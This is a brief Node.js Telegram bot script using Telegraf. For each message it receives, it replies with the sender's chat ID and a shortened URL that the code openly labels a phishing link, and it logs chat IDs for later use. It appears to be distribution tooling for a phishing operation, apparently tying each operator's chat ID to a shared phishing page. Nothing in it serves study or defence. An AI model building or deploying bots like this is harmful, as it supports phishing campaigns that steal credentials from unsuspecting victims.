const { Telegraf } = require('telegraf');
require('dotenv').config(); // For loading .env file

const bot = new Telegraf(process.env.BOT_TOKEN);

// When a user starts the bot
bot.start((ctx) => ctx.reply('Welcome! Please send me any message, and I will give you a phishing link and your chat ID.'));

// When the bot receives a message from the user
bot.on('text', (ctx) => {
  const chatId = ctx.chat.id; // Get the user's chat ID
  console.log(`Received message from Chat ID: ${chatId}`);
  
  // Respond with the user's chat ID and phishing link
  ctx.reply(`Your chat ID is: ${chatId}\nHere is your phishing link: https://is.gd/VLcyev`);
  
  // Optionally, log chat ID to save for further use (e.g., in a file or database)
});

// Launch the bot
bot.launch();